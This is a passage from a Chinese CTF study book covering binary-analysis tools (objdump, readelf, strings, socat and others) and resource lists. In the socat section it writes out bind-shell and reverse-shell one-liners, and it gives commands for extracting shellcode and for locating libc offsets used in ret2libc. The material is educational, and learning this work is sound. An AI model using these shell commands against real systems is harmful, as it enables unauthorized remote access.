md5sum 命令采用MD5报文摘要算法（128位）计算和检查文件的校验和。
-b, --binary read in binary mode
-c, --check read MD5 sums from the FILEs and check them
nm
nm 命令被用于显示二进制目标文件的符号表。
-a, --debug-syms Display debugger-only symbols
-D, --dynamic Display dynamic symbols instead of normal
symbols
-g, --extern-only Display only external symbols
objcopy
如果我们要将一个二进制文件，比如图片、MP3音乐等东西作为目标文件中的一个
段，可以使用 objcopy 工具，比如我们有一个图片文件 “image.jpg”：
1804
9.1 更多 Linux 工具
$ objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o
$ objdump -ht image.o
image.o: file format elf32-i386
Sections:
Idx Name Size VMA LMA File off Algn
0 .data 0000642f 00000000 00000000 00000034 2**0
CONTENTS, ALLOC, LOAD, DATA
SYMBOL TABLE:
00000000 l d .data 00000000 .data
00000000 g .data 00000000 _binary_image_jpg_start
0000642f g .data 00000000 _binary_image_jpg_end
0000642f g *ABS* 00000000 _binary_image_jpg_size
三个变量的使用方法如下：
const char *start = _binary_image_jpg_start; // 数据的起始地址
const char *end = _binary_image_jpg_end; // 数据的末尾地址+1
int size = (int)_binary_image_jpg_size; // 数据大小
这一技巧可能出现在 CTF 隐写题中，使用 foremost 工具可以将图片提取出来：
$ foremost image.o
objdump
objdump 命令是用查看目标文件或者可执行的目标文件的构成的gcc工具。
1805
9.1 更多 Linux 工具
-d, --disassemble Display assembler contents of executabl
e sections
-S, --source Intermix source code with disassembly
-s, --full-contents Display the full contents of all sectio
ns requested
-R, --dynamic-reloc Display the dynamic relocation entries
in the file
-l, --line-numbers Include line numbers and filename
s in output
-M intel Display instruction in Intel ISA
对特定段进行转储：
$ objdump -s -j [section] [binary]
对地址进行指定和转储：
$ objdump -s --start-address=[address] --stop-address=[address]
[binary]
当包含调试信息时，还可以使用 -l 和 -S 来分别对应行号和源码。
结合使用 objdump 和 grep。
$ objdump -d [executable] | grep -A 30 [function_name]
查找 GOT 表地址：
$ objdump -R [binary] | grep [function_name]
从可执行文件中提取 shellcode (注意，在objdump中可能会删除空字节):
$ for i in `objdump -d print_flag | tr '\t' ' ' | tr ' ' '\n' |
egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
1806
9.1 更多 Linux 工具
od
od 命令用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示
或查看文件中不能直接显示在终端的字符。
-A, --address-radix=RADIX output format for file offsets; RA
DIX is one
of [doxn], for Decimal, Octal, H
ex or None
-t, --format=TYPE select output format or formats
-v, --output-duplicates do not use * to mark line suppress
ion
另外加上 z 可以显示 ASCII 码。
用十六进制转存每个字节：
$ od -t x1z -A x [file]
转存字符串：
$ od -A x -s [file]
$ od -A n -s [file]
readelf
readelf 命令用来显示一个或者多个 elf 格式的目标文件的信息，可以通过它的选项
来控制显示哪些信息。
1807
9.1 更多 Linux 工具
-h --file-header Display the ELF file header
-e --headers Equivalent to: -h -l -S
-l --program-headers Display the program headers
-S --section-headers Display the sections' header
-s --syms Display the symbol table
-r --relocs Display the relocations (if present)
-d --dynamic Display the dynamic section (if present)
另外 -w 选项表示 DWARF2 调试信息。
查找库中函数的偏移量，常用于 ret2lib：
$ readelf -s [path/to/library.so] | grep [function_name]@
例如：
$ readelf -s /usr/lib/libc-2.26.so | grep system@
595: 0000000000041fa0 45 FUNC GLOBAL DEFAULT 12 __lib
c_system@@GLIBC_PRIVATE
1378: 0000000000041fa0 45 FUNC WEAK DEFAULT 12 syste
m@@GLIBC_2.2.5
socat
socat 是 netcat 的加强版，CTF 中经常需要使用使用它连接服务器。
$ yaourt -S socat
$ socat [options]  
连接远程端口
$ socat - TCP:localhost:80
1808
9.1 更多 Linux 工具
监听端口
$ socat TCP-LISTEN:700 -
正向 shell
$ socat TCP-LISTEN:700 EXEC:/bin/bash
反弹 shell
$ socat tcp-connect:localhost:700 exec:'bash -li',pty,stderr,set
sid,sigint,sane
将本地 80 端口转发到远程的 80 端口
$ socat TCP-LISTEN:80,fork TCP:www.domain.org:80
fork 服务器
$ socat tcp-l:9999,fork exec:./pwn1
跟踪 malloc 和 free 调用及相应的地址：
$ socat tcp-listen:1337,fork,reuseaddr system:"ltrace -f -e mall
oc+PI:EMAIL* ./pwn"
ssdeep
模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise
hashing, CTPH），主要用于文件的相似性比较。
-m - Match FILES against known hashes in file
-b - Uses only the bare name of files; all path information omit
ted
1809
9.1 更多 Linux 工具
$ ssdeep -b orginal.elf > hash.txt
$ ssdeep -bm hash.txt modified.elf
strace
strace 命令对应用的系统调用和信号传递的跟踪结果进行分析，以达到解决问题或
者是了解应用工作过程的目的。
-i print instruction pointer at time of syscall
-o file send trace output to FILE instead of stderr
-c count time, calls, and errors for each syscall an
d report summary
-e expr a qualifying expression: option=[!]all or option=
[!]val1[,val2]...
options: trace, abbrev, verbose, raw, signal, read, write,
fault
-p pid trace process with process id PID, may be repeate
d
-f follow forks
strip
strip 命令用于删除可执行文件中的符号和段。
-g -S -d --strip-debug Remove all debugging symbols &
sections
-R --remove-section= Also remove section  from
the output
使用 -d 后，可以删除不使用的信息，并保留函数名等。用 gdb 进行调试时，只
要保留了函数名，都可以进行调试。另外如果对 .o 和 .a 文件进行 strip 后，
就不能和其他目标文件进行链接了。
strings
1810
9.1 更多 Linux 工具
strings 命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多
可打印字符的任意序列，以换行符或空字符结束。strings 命令对识别随机对象文件
很有用。
-a --all Scan the entire file, not just the dat
a section [default]
-t --radix={o,d,x} Print the location of the string in ba
se 8, 10 or 16
-e --encoding={s,S,b,l,B,L} Select character size and endianess:
s = 7-bit, S = 8-bit, {b,l} = 16-bit
, {B,L} = 32-bit
-e 的作用，例如在这样一个二进制文件中：
$ rabin2 -z a.out
vaddr=0x080485d0 paddr=0x000005d0 ordinal=000 sz=17 len=16 secti
on=.rodata type=ascii string=Enter password:
vaddr=0x080485e5 paddr=0x000005e5 ordinal=001 sz=10 len=9 sectio
n=.rodata type=ascii string=Congrats!
vaddr=0x080485ef paddr=0x000005ef ordinal=002 sz=7 len=6 section
=.rodata type=ascii string=Wrong!
vaddr=0x0804a040 paddr=0x00001040 ordinal=000 sz=36 len=8 sectio
n=.data type=utf32le string=w0wgreat
字符串 w0wgreat 类型为 utf32le，而不是传统的 ascii，这时 strings 就需要指定
-e L 参数：
$ strings a.out | grep w0wgreat
$ strings -e L a.out | grep w0wgreat
w0wgreat
组合使用 strings 和 grep。
在 ret2lib 攻击中，得到字符串的偏移：
$ strings -t x /lib32/libc-2.24.so | grep /bin/sh
1811
9.1 更多 Linux 工具
检查是否使用了 UPX 加壳
$ strings [executable] | grep -i upx
valgrind
valgrind 能检测出内存的非法使用等。使用它无需在检测对象程序编译时指定特别
的参数，也不需要链接其他的函数库。
--leak-check=no|summary|full search for memory leaks at exit
? [summary]
--show-reachable=yes same as --show-leak-kinds=all
--trace-children=no|yes Valgrind-ise child processes (follow e
xecve)? [no]
--vgdb=no|yes|full activate gdbserver? [yes]
full is slower but provides precise wa
tchpoint/step
xxd
xxd 的作用就是将一个文件以十六进制的形式显示出来。
-g number of octets per group in normal output. Default
2 (-e: 4).
-i output in C include file style.
-l len stop after  octets.
-r reverse operation: convert (or patch) hexdump into b
inary.
-u use upper case hex letters.
$ xxd -g1 [binary]
1812
9.2 更多 Windows 工具
9.2 更多 Windows 工具
010 Editor
DIE
PEiD
PE Studio
PEview
PortEx Analyzer
Resource Hacker
wxHexEditor
PDF Stream Dumper
EMET
010 Editor
https://www.sweetscape.com/010editor/
DIE
http://ntinfo.biz/
PEiD
http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/PEiD-
updated.shtml
PEiD 是一个用于检测常用壳，加密，压缩的小程序。恶意软件编写者通常会进行
加壳和混淆让恶意软件不容易被检测和分析。PEiD 可以检查超过 600 种不同的 PE
文件签名，这些数据存放在 userdb.txt 文件中。
PE Studio
https://www.winitor.com/
1813
9.2 更多 Windows 工具
PEview
http://wjradburn.com/software/
PortEx Analyzer
https://github.com/katjahahn/PortEx
Resource Hacker
http://www.angusj.com/resourcehacker/
wxHexEditor
http://www.wxhexeditor.org/
PDF Stream Dumper
http://sandsprite.com/blogs/index.php?uid=7&pid=57
EMET
https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-
experience-toolkit
1814
9.3 更多资源
9.3 更多资源
课程
站点
文章
书籍
课程
Intro to Computer Systems, Summer 2017
Modern Binary Exploitation Spring 2015
OpenSecurityTraining
Stanford Computer Security Laboratory
CS642 Fall 2014: Computer Security
Offensive Computer Security Spring 2014
System Security and Binary Code Analysis
SATSMT Summer School 2011
CS 161 : Computer Security Spring 2017
Introduction to Computer Security Fall 2015
格式化字符串blind pwn详细教程
软件分析技术
Compiler Design
Optimizing Compilers
Principles of Program Analysis
Static Program Analysis
CS 252r: Advanced Topics in Programming Languages
Advanced Digital Forensics and Data Reverse Engineering
CS261: Security in Computer Systems
CS 161 : Computer Security Spring 2015
Secure Software Systems Spring 2017
CS 576 Secure Systems Fall 2014
CS 577 Cybersecurity Lab Fall 2014
1815
9.3 更多资源
站点
sec-wiki
Shellcodes database for study cases
Corelan Team Articles
LOW-LEVEL ATTACKS AND DEFENSES
FuzzySecurity
LiveOverflow
文章
Debugging Fundamentals for Exploit Development
Introduction to return oriented programming (ROP)
Smashing The Stack For Fun And Profit
Understanding DEP as a mitigation technology part 1
Tricks for Exploit Development
Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites
with SEHOP
From 0x90 to 0x4c454554, a journey into exploitation.
Checking the boundaries of static analysis
Deep Wizardry: Stack Unwinding
Linux (x86) Exploit Development Series
Hack The Virtual Memory
书籍
Hacking: The Art of Exploitation, 2nd Edition by Jon Erickson
The Shellcoder's Handbook: Discovering and Exploiting Security Holes, 2nd
Edition by Chris Anley et al
The IDA Pro Book: The Unofficial Guide to the World's Most Popular
Disassembler 2nd Edition
Practical Malware Analysis by Michael Sikorski and Andrew Honig
Practical Reverse Engineering by Dang, Gazet, Bachaalany
Fuzzing: Brute Force Vulnerability Discovery
1816
9.3 更多资源
1817
9.4 Linux 系统调用表
9.4 Linux x86-64 系统调用表
Linux System Call Table for x86 64
syscall_32
syscall_64
1818
9.5 幻灯片
9.5 幻灯片
这些是我在 XDSEC 做分享的 PPT，主要内容取自 CTF-All-In-One，可作为辅助学
习。
01 Fight with Linux
1819